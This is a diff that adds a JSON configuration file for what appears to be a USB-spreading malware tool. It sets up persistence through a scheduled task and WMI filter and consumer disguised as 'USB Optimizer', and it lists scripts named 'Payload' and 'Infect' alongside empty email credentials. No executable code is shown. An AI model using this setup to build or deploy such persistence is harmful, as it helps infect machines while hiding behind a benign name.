@@ -1,0 +1,24 @@
+{
+   "Persistence": {
+      "ScheduleTask": {
+         "TaskName": "USB Optimizer",
+         "Registry": {
+            "Path": "HKLM:",
+            "Name": "D"
+         }
+      },
+      "WMI": {
+         "FilterName": "USB Optimizer",
+         "ConsumerName": "Optimize USB"
+      }
+   },
+   "ScriptNames": {
+      "Payload": "Payload",
+      "Remove": "Remove",
+      "Infect": "Infect"
+   },
+   "Email": {
+      "User": "",
+      "Password": ""
+   }
+}
